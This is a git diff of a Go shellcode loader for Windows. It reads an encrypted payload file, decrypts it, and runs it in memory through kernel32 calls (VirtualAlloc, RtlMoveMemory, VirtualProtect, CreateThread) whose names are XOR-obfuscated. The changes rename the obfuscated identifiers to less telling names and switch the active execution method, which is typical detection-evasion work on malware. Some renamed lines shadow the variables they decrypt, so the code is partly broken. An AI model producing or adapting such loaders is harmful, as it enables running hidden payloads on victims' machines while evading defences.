@@ -35,10 +35,10 @@ const myKey = byte(0x01)
 
 // encrypted
 var (
-	kernel32      = xorEncrypt([]byte("kernel32.dll"), myKey)
-	RtlMoveMemory = xorEncrypt([]byte("RtlMoveMemory"), myKey)
-	CreateThread  = xorEncrypt([]byte("CreateThread"), myKey)
-	ExitProcess   = xorEncrypt([]byte("ExitProcess"), myKey)
+	kdog  = xorEncrypt([]byte("kernel32.dll"), myKey)  //kernel32=kdog
+	RTLMM = xorEncrypt([]byte("RtlMoveMemory"), myKey) //RtlMoveMemory=RTLMM
+	CT    = xorEncrypt([]byte("CreateThread"), myKey)  //CreateThread=CT
+	EP    = xorEncrypt([]byte("ExitProcess"), myKey)   //ExitProcess=EP
 )
 
 var shellcode []byte
@@ -46,8 +46,8 @@ var shellcode []byte
 func main() {
 	getFile()
 	decryptFile()
-	//method1_SysCall_XOR(shellcode)
-	method2_CreateThreadXOR(shellcode)
+	method1_SysCall_XOR(shellcode)
+	//method2_CreateThreadXOR(shellcode)
 }
 
 func getFile() {
@@ -74,7 +74,7 @@ func getFile() {
 func decryptFile() {
 	// Reading ciphertext file
 	//C:\\Users\\Public\\Downloads\\ENC.bin" /path will be used for later
-	file, err := os.Open("ENC.bin")
+	file, err := os.Open("2ENC.bin")
 	if err != nil {
 		log.Fatalf("Error opening file: %v", err)
 	}
@@ -158,15 +158,15 @@ func method1_SysCall_XOR(sc []byte) {
 	*/
 
 	//Decrypt
-	kernel32dll := windows.NewLazyDLL(string(xorDecrypt(kernel32, myKey)))
-	RtlMoveMemoryProc := kernel32dll.NewProc(string(xorDecrypt(RtlMoveMemory, myKey)))
+	kdog := windows.NewLazyDLL(string(xorDecrypt(kdog, myKey)))
+	RTLMM := kdog.NewProc(string(xorDecrypt(RTLMM, myKey)))
 
 	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if err != nil {
 		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
 	}
-	RtlMoveMemoryProc.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
+	RTLMM.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
 	var oldProtect uint32
 	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
 	if err != nil {
@@ -189,23 +189,23 @@ func method2_CreateThreadXOR(sc []byte) {
 	*/
 
 	//Decrypted
-	kernel32dll := windows.NewLazyDLL(string(xorDecrypt(kernel32, myKey)))
-	RtlMoveMemoryProc := kernel32dll.NewProc(string(xorDecrypt(RtlMoveMemory, myKey)))
-	CreateThreadProc := kernel32dll.NewProc(string(xorDecrypt(CreateThread, myKey)))
-	ExitProcessProc := kernel32dll.NewProc(string(xorDecrypt(ExitProcess, myKey)))
+	kdog := windows.NewLazyDLL(string(xorDecrypt(kdog, myKey)))
+	RTLMM := kdog.NewProc(string(xorDecrypt(RTLMM, myKey)))
+	CT := kdog.NewProc(string(xorDecrypt(CT, myKey)))
+	ExitProcessProc := kdog.NewProc(string(xorDecrypt(EP, myKey)))
 
 	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if err != nil {
 		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
 	}
-	RtlMoveMemoryProc.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), (uintptr)(len(sc)))
+	RTLMM.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), (uintptr)(len(sc)))
 	var oldProtect uint32
 	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
 	if err != nil {
 		panic(fmt.Sprintf("[!] VirtualProtect(): %s", err.Error()))
 	}
-	thread, _, err := CreateThreadProc.Call(0, 0, addr, uintptr(0), 0, 0)
+	thread, _, err := CT.Call(0, 0, addr, uintptr(0), 0, 0)
 	if err.Error() != "The operation completed successfully." {
 		panic(fmt.Sprintf("[!] CreateThread(): %s", err.Error()))
 	}
